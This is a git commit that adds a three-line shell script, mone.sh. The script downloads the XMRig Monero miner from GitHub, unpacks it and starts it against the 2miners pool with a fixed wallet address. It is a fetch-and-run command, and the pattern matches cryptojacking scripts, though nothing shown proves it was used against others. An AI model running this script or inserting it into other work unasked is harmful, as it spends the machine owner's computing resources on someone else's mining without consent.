ef11b5aa7bded0df840425dbd351660ab7b1972f
adefff <108704960+adefff@users.noreply.github.com>
2022-11-12 11:35:47 +0700

    Create mone.sh

---
+++ mone.sh
@@ -0,0 +1,3 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
+tar xf xmrig-6.15.1-linux-x64.tar.gz
+cd xmrig-6.15.1 && ./xmrig -o xmr.2miners.com:2222 -a rx -k -p x -t 4 -u 89EdM7v6cVoJK99vu7BAJVcukHgrtR5qtG9Qk29iCLBdJNcYVg99trTWasc3WKh2yJVuMuh7xRnXSTTeFFyaZ8HN9xCwtLk.kerja
